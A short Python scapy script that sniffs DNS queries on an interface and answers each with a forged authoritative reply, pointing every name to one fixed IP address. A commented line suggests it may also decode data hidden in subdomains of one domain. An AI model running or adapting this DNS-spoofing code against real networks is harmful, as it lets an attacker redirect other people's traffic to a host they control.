#! /usr/bin/env python3
from scapy.all import *

def query(data):
    pass

def reply(pkt):
    # Construct the IP header by looking at the sniffed packet
    ip = IP(
        src=pkt[IP].dst,
        dst=pkt[IP].src
        )

    udp = UDP(
            dport=pkt[UDP].sport,
            sport=pkt[UDP].dport
            )

    dns = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1,
            qr=1,
            an=DNSRR(
                    rrname=pkt[DNS].qd.qname,
                    type='A',
                    ttl=600,
                    rdata='20.249.220.128'
                )
            )

    response = ip / udp / dns

    send(response, iface="eth0")


def pkt_callback(pkt):
        #data = pkt.qd.qname.split(b".platypew.social")[0]
        #print(data)

        reply(pkt)



sniff(iface="eth0", prn=pkt_callback, filter="udp dst port 53 and udp[10] & 0x80 = 0", store=0)
